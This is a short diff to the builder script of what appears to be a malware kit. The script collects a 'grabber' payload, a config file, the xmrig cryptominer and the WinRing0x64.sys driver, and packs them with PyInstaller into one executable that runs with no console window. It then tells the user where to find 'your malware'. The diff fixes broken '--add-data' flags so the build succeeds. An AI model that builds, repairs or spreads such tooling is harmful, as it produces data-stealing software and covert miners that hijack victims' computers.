@@ -321,7 +321,7 @@ try:
               file_path = os.path.join("./", filename)
               os.remove(file_path)
       except:
-        print("First build detected hehe")
+        print("First/broken build detected hehe")
       os.mkdir("./build/")
       shutil.copy("./grabber_utils/CODE.py", "./build/")
       filename= input("Name of the file: ")
@@ -345,10 +345,10 @@ try:
         f.close()
       if platform.system() == "Windows":
         import PyInstaller.__main__
-        PyInstaller.__main__.run([f"./build/{filename}.py", "--onefile", "--add-data./grabber_utils/cosita_toolkit.py;.","--add-data=./build/CONFIG.json;.", "--add-data=./grabber_utils/xmrig.exe;.", "--add-data=./grabber_0utils/WinRing0x64.sys;.","--clean","--workpath=./build/","--noconsole"])
+        PyInstaller.__main__.run([f"./build/{filename}.py", "--onefile", "--add-data=./grabber_utils/cosita_toolkit.py;.","--add-data=./build/CONFIG.json;.", "--add-data=./grabber_utils/xmrig.exe;.", "--add-data=./grabber_0utils/WinRing0x64.sys;.","--clean","--workpath=./build/","--noconsole"])
       else:
         import PyInstaller.__main__
-        PyInstaller.__main__.run([f"./build/{filename}.py", "--onefile","--add-data=./build/CONFIG.json:.", "--add-data./grabber_utils/cosita_toolkit.py:.", "--add-data=./grabber_utils/xmrig:.","--clean","--workpath=./build/"])
+        PyInstaller.__main__.run([f"./build/{filename}.py", "--onefile","--add-data=./build/CONFIG.json:.", "--add-data=./grabber_utils/cosita_toolkit.py:.", "--add-data=./grabber_utils/xmrig:.","--clean","--workpath=./build/"])
       print(f"You will find your malware inside ./dist/{filename}")
     elif choice == 99:
         Write.Print(f'''
